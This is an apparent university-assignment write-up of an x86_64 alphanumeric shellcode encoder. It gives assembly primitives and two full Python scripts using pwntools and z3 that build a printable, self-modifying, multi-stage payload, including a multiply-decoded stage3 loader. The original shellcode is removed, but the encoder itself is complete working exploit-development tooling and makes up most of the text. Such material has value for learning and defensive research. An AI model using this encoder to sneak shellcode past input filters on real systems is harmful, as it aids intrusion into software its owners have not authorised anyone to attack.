# Writeup

This was an assignment for a university course. I removed the original shellcode to prevent plagiarism but the encoder is OK to publish.

It was a really fun but difficult challenge. On x86_32, I would usually just use msfvenom to encode it for me. But there isn't an alphanumeric encoder for x86_64 (and also it would defeat the purpose of the challenge).

I could have converted the shellcode from binary to printable manually, but I thought that would be too difficult. So instead, I wrote an encoder to do it for me.

My key intuition was that since we had available a pointer to the shellcode in `rdx`, we could use that to write a binary stage2 shellcode after the stage1 stub.

The first task is to assemble some primitives. The 32-bit printable instruction set is pretty strong, but the 64-bit one is extremely limited. I used [this table](https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes#m) as a reference. Also, while I was developing the shellcode I used [winrepl](https://github.com/zerosum0x0/WinREPL) which was a huge help.

Generally speaking, with our limited instruction set, we *do* have the ability to push and pop nearly any register to the stack, luckily. Moreover, we have a lot of control over `eax` too, with `xor` and `sub`, and we can use `xor` pretty freely.

Our first primitive will just be to just zero a register: 

```
push rsp ; used for indirect reference to rsi
pop r9
pop r8 ; junk register, used to realign rsp.
push rsi
xor rsi, [r9] ; r9 points to stack holding rsi's value
```

That zeroes `rsi`. Then we can use the stack to transfer that zero to any other register:

```
push rsi
pop rax
```

Our next important primitive is to write to memory. We can accomplish this using `xor` with `xor [rdx+rdi], esi`. But of course, that would mean that `[rdx+rdi]` has to be zeroed first. We can accomplish that using `movsx` then an `xor`:

```
movsx rsi, dword ptr [rdx+rdi] ; zero 4 bytes
xor [rdx+rdi], esi
push rax
pop rsi
xor [rdx+rdi], esi ; [rdx + rdi] = rax
```

That's great and all, but we're still stuck with this indirect write. `rdx` already points to our shellcode, but what about `rdi`? We want to be able to set `rdi` to any arbitrary offset and `rax` to any arbitrary value.

To do that, I made use of the `sub imm32` and `xor imm32` instructions available on `eax`. But hold on, our immediates also have to be printable too! I first tried only using `xor`, but that would mean I can't create the value `0x80`, for example. If we had `sub`, the key observation is that since there's underflow and overflow, all of the zero bytes could cancel out over multiple subtractions. To implement this, for each immediate value, I set up a system of bitvector equations and used `z3` to solve them. The solution encodes a printable way to create any arbitrary 32-bit value in `eax`.

With all of our primitives in place, it's trivial to just encode our stage2 binary shellcode into a series of dwords and write them one-by-one after our bootstrapping stub. The encoding is pretty inefficient; it's about 71-100 bytes per 4 bytes, so writing a small stage2 shellcode is important.

```python
#!/usr/bin/env python

from pwn import *
from z3 import *
import operator

def is_ok(b):
    return b >= 0x20 and b < 0x80

def is_ok32(i32):
    return reduce(operator.and_, is_ok_str(p32(i32)))

def is_ok_str(s):
    return map(is_ok, map(ord, s))

def check(shellcode):
    for b in shellcode:
        assert(is_ok(ord(b)))
    return True

# really f--king overkill
s = Solver()
def solve_add_eax(i32):
    for i in range(0,10):
        s.reset()
        x = BitVec('x', 32)
        variables = []
        for j in range(0, i):
            variables.append(BitVec('a%d' % (j,), 32))
        expr = x
        for var in variables[0:]:
            expr = expr - var
        s.add(ForAll(x, expr == x + BitVecVal(i32, 32)))
        for var in variables:
            for k in range(0, 32, 8):
                s.add(Extract(k+7, k, var) >= BitVecVal(0x20, 8))
                s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
        if str(s.check()) == 'sat':
            m = s.model()
            return map(int, map(str, map(m.evaluate, variables)))
    else:
        raise ValueError("couldn't solve eax=%08x" %(i32,))

def solve_set_eax(i32):
    for i in range(0,10):
        s.reset()
        z = BitVec('z', 32)
        variables = [z]
        for j in range(0, i):
            variables.append(BitVec('a%d' % (j,), 32))
        expr = BitVecVal(0, 32)
        for var in variables[1:]:
            expr = expr - var
        s.add(expr ^ z == BitVecVal(i32, 32))
        for var in variables:
            for k in range(0, 32, 8):
                s.add(Extract(k+7, k, var) >= BitVecVal(0x20, 8))
                s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
        if str(s.check()) == 'sat':
            m = s.model()
            return map(int, map(str, map(m.evaluate, variables)))
    else:
        raise ValueError("couldn't solve eax=%08x" %(i32,))

def add_eax(i32):
    shellcode = ''
    soln = solve_add_eax(i32)
    for sub in soln:
        shellcode += 'sub eax, 0x%08x\n' % (sub,)
        assert (is_ok32(sub))
    return asm(shellcode, arch='amd64')

def set_eax(i32):
    shellcode = 'push rbx; pop rax;'
    soln = solve_set_eax(i32)
    for sub in soln[1:]:
        shellcode += 'sub eax, 0x%08x\n' % (sub,)
        assert (is_ok32(sub))
    shellcode += 'xor eax, 0x%08x' % (soln[0])
    assert (is_ok32(soln[0]))
    return asm(shellcode, arch='amd64')

# rdi = rax = controlled, r8 and r9 clobbered
def set_rdi(i32):
    return set_eax(i32) + asm('push rax; pop rdi', arch='amd64')

def add_rdi(i32):
    return asm('push rdi; pop rax;', arch='amd64') + add_eax(i32) + asm('push rax; pop rdi', arch='amd64')

add_rdi_4 = add_rdi(4)

# writes arbitrary 4 bytes at [rdx+offset], rcx, rax, rsi clobbered
# rdi incremented by 4
def write4(i32):
    shellcode = ''

    # zero 4 bytes at rdx+rdi
    shellcode += asm('''
movsx rsi, dword ptr [rdx+rdi]
xor [rdx+rdi], esi
''', arch='amd64')
    
    shellcode += set_eax(i32)

    # [rdx+rdi] = rsi = [rcx] = rax
    shellcode += asm('''
push rax
pop rsi
xor [rdx+rdi], esi
''', arch='amd64')

    shellcode += add_rdi_4

    return shellcode

def xlate(code, offset):
    # rdx = ptr to shellcode DON'T CLOBBER ME, i know where you live
    payload = ''

    # zero rsi and rax, clobber r8 and r9
    payload += asm('''
push rsp
pop r9
pop r8
push rsi
xor rsi, [r9]
push rsi
pop rax
''', arch='amd64') # zero eax
    payload += asm('push rax; pop rbx;', arch='amd64') # save zero in rbx for later uses

    payload += set_rdi(offset) # set rdi
    for i in range(0, len(stage2), 4):
        frag = stage2[i:i+4]
        xlate_frag = write4(u32(frag))
        payload += xlate_frag
        print '%s => %s' % (frag.encode('hex'), xlate_frag.encode('hex'))

    return payload

stage2 = asm('''
/* your shellcode here o_O */
''', arch='amd64')
stage2 += '\x90' * (-len(stage2) % 4) # pad
print stage2

# we don't know the size of our xlated shellcode so we'll do a "mock run" to figure that out first.
payload = xlate(stage2, 0)
hdr_len = len(payload)
payload = xlate(stage2, hdr_len)
assert len(payload) == hdr_len
assert is_ok_str(payload)
print len(payload)
assert len(payload) < 4096

print payload
open('shellcode.txt', 'wb').write(payload)
```

A little bit overkill. Most of the size is responsible for incrementing `rdi` by 4 after each dword we write. Unfortunately, there's no way to not inline this since we have no control over our control flow unless we did some crazy self-modifying code...which is exactly what I did.

```python
#!/usr/bin/env python

from pwn import *
from z3 import *
import operator

def is_ok(b):
    return b >= 0x20 and b < 0x80

def is_ok32(i32):
    return reduce(operator.and_, is_ok_str(p32(i32)))

def is_ok_str(s):
    return map(is_ok, map(ord, s))

def check(shellcode):
    for b in shellcode:
        assert(is_ok(ord(b)))
    return True

# really f--king overkill
s = Solver()
def solve_add_eax(i32):
    s.reset()
    x = BitVec('x', 32)
    variables = []
    for j in range(0, 3):
        variables.append(BitVec('a%d' % (j,), 32))
    expr = x
    for var in variables[0:]:
        expr = expr - var
    s.add(ForAll(x, expr == x + BitVecVal(i32, 32)))
    for var in variables:
        for k in range(0, 32, 8):
            s.add(Extract(k+7, k, var) >= BitVecVal(0x20, 8))
            s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
    if str(s.check()) == 'sat':
        m = s.model()
        return map(int, map(str, map(m.evaluate, variables)))
    else:
        raise ValueError("couldn't solve eax=%08x" %(i32,))

def solve_set_eax(i32):
    s.reset()
    z = BitVec('z', 32)
    variables = [z]
    for j in range(0, 2):
        variables.append(BitVec('a%d' % (j,), 32))
    expr = BitVecVal(0, 32)
    for var in variables[1:]:
        expr = expr - var
    s.add(expr ^ z == BitVecVal(i32, 32))
    for var in variables:
        for k in range(0, 32, 8):
            s.add(Extract(k+7, k, var) >= BitVecVal(0x20, 8))
            s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
    if str(s.check()) == 'sat':
        m = s.model()
        return map(int, map(str, map(m.evaluate, variables)))
    else:
        raise ValueError("couldn't solve eax=%08x" %(i32,))

def solve_set_rax(i64):
    s.reset()
    z = BitVec('z', 64)
    variables = [z]
    for j in range(0, 1):
        variables.append(BitVec('a%d' % (j,), 64))
    expr = z
    for var in variables[1:]:
        expr = expr * var
    s.add(expr == BitVecVal(i64, 64))
    for var in variables:
        for k in range(0, 64, 8):
            s.add(Extract(k+7, k, var) >= BitVecVal(0x20, 8))
            s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
    if str(s.check()) == 'sat':
        m = s.model()
        return map(int, map(str, map(m.evaluate, variables)))
    else:
        raise ValueError("couldn't solve eax=%016x" %(i64,))

def add_eax(i32):
    shellcode = ''
    soln = solve_add_eax(i32)
    for sub in soln:
        shellcode += 'sub eax, 0x%08x\n' % (sub,)
        assert (is_ok32(sub))
    return asm(shellcode, arch='amd64')

def set_eax(i32):
    shellcode = 'push rbx; pop rax;'
    soln = solve_set_eax(i32)
    for sub in soln[1:]:
        shellcode += 'sub eax, 0x%08x\n' % (sub,)
        assert (is_ok32(sub))
    shellcode += 'xor eax, 0x%08x' % (soln[0])
    assert (is_ok32(soln[0]))
    return asm(shellcode, arch='amd64')

# rdi = rax = controlled, r8 and r9 clobbered
def set_rdi(i32):
    return set_eax(i32) + asm('push rax; pop rdi', arch='amd64')

def set_rsi(i32):
    return set_eax(i32) + asm('push rax; pop rsi', arch='amd64')

def add_rdi(i32):
    return asm('push rdi; pop rax;', arch='amd64') + add_eax(i32) + asm('push rax; pop rdi', arch='amd64')

add_rdi_4 = add_rdi(4)

# writes arbitrary 4 bytes at [rdx+offset], rcx, rax, rsi clobbered
# rdi incremented by 4
def write4(i32):
    shellcode = ''

    # zero 4 bytes at rdx+rdi
    shellcode += asm('''
movsx rsi, dword ptr [rdx+rdi]
xor [rdx+rdi], esi
''', arch='amd64')
    
    shellcode += set_eax(i32)

    # [rdx+rdi] = rsi = [rcx] = rax
    shellcode += asm('''
push rax
pop rsi
xor [rdx+rdi], esi
''', arch='amd64')

    shellcode += add_rdi_4

    return shellcode

def xlate(stage2, stage3):
    # rdx = ptr to shellcode DON'T CLOBBER ME, i know where you live
    payload = ''

    # zero rsi and rax, clobber r8 and r9
    payload += asm('''
push rsp
pop r9
pop r8
push rsi
xor rsi, [r9]
push rsi
pop rax
''', arch='amd64') # zero eax
    payload += asm('push rax; push rax; pop rbx; pop rdi;', arch='amd64') # save zero in rbx for later uses

    for i in range(0, len(stage2), 4):
        frag = stage2[i:i+4]
        xlate_frag = write4(u32(frag))
        payload += xlate_frag
        print '%s => %s' % (frag.encode('hex'), xlate_frag.encode('hex'))

    stage3_thunk = ''
    for i in range(0, len(stage3), 8):
        frag = stage3[i:i+8]
        xlate_frags = map(p64, solve_set_rax(u64(frag)))
        print '%s =>' % (frag.encode('hex'),),
        for xlate_frag in xlate_frags:
            stage3_thunk += xlate_frag
            print xlate_frag.encode('hex'),
        print

    len_set_rdi = len(set_rdi(0xdeadbeef))
    len_write4 = len(write4(0xdeadbeef))

    # assemble args for and jump to stage2
    offset_of_jump = len(payload) + len_set_rdi + len_write4 + 2 * len_set_rdi
    print "Jump at +%d\n" % (offset_of_jump,)
    payload += set_rdi(offset_of_jump) # point to jmp instruction location
    payload += write4(u32(asm('jmp rdx; nop; nop;', arch='amd64')))

    payload += set_rsi(offset_of_jump + 4) # point to stage3 thunk
    payload += set_rdi(len(stage2)) # point to after stage2
    payload += 'AAAA' # gets overwritten by jmp
    payload += stage3_thunk

    return payload

stage2 = asm('''
loop:
mov rax, qword ptr [rdx+rsi]
imul rax, qword ptr [rdx+rsi+8]
mov qword ptr [rdx+rdi], rax
add edi, 8
add esi, 16
test eax,eax
jnz loop
''', arch='amd64')
stage2 += '\x90' * (-len(stage2) % 4) # pad

stage3 = asm('''
/* your shellcode here o_O */
''', arch='amd64')
stage3 += '\x90' * (-len(stage3) % 8) # pad

payload = xlate(stage2, stage3)

assert is_ok_str(payload)
print len(payload)
assert len(payload) < 4096

print payload
open('shellcode.txt', 'wb').write(payload)
```

It bootstraps itself by writing a "decryption" loop (stage2) that decodes the multiply-encoded stage3.

Layout of payload (sick ascii art):
```
   /--->printable write4s to write stage2 /-> gets overwritten with stage2
   |                 v                    |              v
/--+--->printable write4s to write stage2 |   gets overwritten with stage3
|  |                 v                    |
|  |    printable write4s to write stage2 |
|  |                 v                    |
|  | /--load rdi to offset of jump        |
|  | |               v                    |
|  \-+--write4 jump instruction           |  
|    |               v                    |
| /--+--set rsi parameter stage2          |
| |  |               v                    |
\-+--+--set rdi parameter for stage2      |
  |  |               v                    |
  |  \->to be filled in by write4 jmp ----/
  |
  \---->encoded stage3
```

Aside: it's not really important that `rdx` holds our shellcode. We can grab a pointer easily.
For example, suppose that we entered our shellcode by overwriting a return address on the stack.
Then, we could simply do:

```
pop rax ; allocate down to not overwrite return pointer
push rsp ; zero rsi
pop r9
pop r8 ;
push rsi
xor rsi, [r9]
push rsi
pop rax ; now set rax to 0x10
xor eax, 0x20202020
xor eax, 0x20202030
push rsp
pop r9
pop r8
push rax ; r9 now points to rax
sub sp, [r9] ; decrement sp without overwriting (pushing)
pop rdx ; ptr to return value (shellcode) now in rdx
```

One caveat is that the multiply-encoder can't encode code QWORDS which end in 0x00, because that of multiplication works in the ring `Z/(2**64 Z)`. However, we can bypass this simply by padding any bad QWORDS with nops (0x90). Even if there is a 8-byte instruction that ends with 0x00, we can simply "mis-align" with a nop it so that the 0x00 isn't at the end of the QWORD boundary.
